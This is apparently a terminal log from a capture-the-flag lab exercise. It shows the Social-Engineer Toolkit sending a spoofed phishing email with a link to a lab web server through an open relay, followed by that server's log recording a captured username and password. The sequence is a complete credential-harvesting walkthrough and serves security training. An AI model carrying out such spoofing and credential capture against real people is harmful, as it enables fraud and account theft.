# Social-Engineer Toolkit

```bash
[---] The Social-Engineer Toolkit (SET) [---] [---] Created by: David Kennedy
(ReL1K) [---] Version: 8.0.3 Codename: 'Maverick' [---] Follow us on Twitter:
@TrustedSec [---] [---] Follow me on Twitter: @HackingDave [---] [---] Homepage:
https://www.trustedsec.com [---] Welcome to the Social-Engineer Toolkit (SET).
The one stop shop for all of your SE needs.

The Social-Engineer Toolkit is a product of TrustedSec.

           Visit: https://www.trustedsec.com

It's easy to update using the PenTesters Framework! (PTF) Visit
https://github.com/trustedsec/ptf to update all your tools!

Select from the menu:

1.  Spear-Phishing Attack Vectors
2.  Website Attack Vectors
3.  Infectious Media Generator
4.  Create a Payload and Listener
5.  Mass Mailer Attack
6.  Arduino-Based Attack Vector
7.  Wireless Access Point Attack Vector
8.  QRCode Generator Attack Vector
9.  Powershell Attack Vectors
10. Third Party Modules

11. Return back to the main menu.

set> 5

Social Engineer Toolkit Mass E-Mailer

There are two options on the mass e-mailer, the first would be to send an email
to one individual person. The second option will allow you to import a list and
send it to as many people as you want within that list.

What do you want to do:

    1.  E-Mail Attack Single Email Address
    2.  E-Mail Attack Mass Mailer

    99. Return to main menu.

set:mailer>1 set:phishing> Send email to:factory@wareville.thm

1. Use a gmail Account for your email attack.
2. Use your own server or open relay

set:phishing>2 set:phishing> From address (ex:
moo@example.com):updates@flyingdeer.thm set:phishing> The FROM NAME the user
will see:Flying Deer set:phishing> Username for open-relay [blank]: Password for
open-relay [blank]: set:phishing> SMTP email server address (ex.
smtp.youremailserveryouown.com):10.80.141.131 set:phishing> Port number for the
SMTP server [25]:25 set:phishing> Flag this message/s as high priority?
[yes|no]:no Do you want to attach a file - [y/n]: n Do you want to attach an
inline file - [y/n]: n set:phishing> Email subject:Shipping Schedule Changes
set:phishing> Send the message as html or plain? 'h' or 'p' [p]: [!] IMPORTANT:
When finished, type END (all capital) then hit {return} on a new line.
set:phishing> Enter the body of the message, type END (capitals) when
finishe^[[3~ Next line of the body: Hello! visit http://10.80.103.4:8000 Next
line of the body: END [*] SET has finished sending the emails

      Press <return> to continue

## Server

root@ip-10-80-103-4:~# cd ~/Rooms/AoC2025/Day02
root@ip-10-80-103-4:~/Rooms/AoC2025/Day02# ./server.py Starting server on
http://0.0.0.0:8000 10.80.103.4 - - [05/Dec/2025 08:52:28] "GET / HTTP/1.1"
200 - 10.80.103.4 - - [05/Dec/2025 08:52:29] "GET /favicon.ico HTTP/1.1" 404 -

10.80.141.131 - - [05/Dec/2025 08:57:03] "GET / HTTP/1.1" 200 - [2025-12-05
08:57:03] Captured -> username: admin password: unranked-wisdom-anthem from:
10.80.141.131 10.80.141.131 - - [05/Dec/2025 08:57:03] "POST /submit HTTP/1.1"
303 - 10.80.141.131 - - [05/Dec/2025 08:57:03] "GET / HTTP/1.1" 200 -
10.80.103.4 - - [05/Dec/2025 08:57:05] "GET / HTTP/1.1" 200 -
```
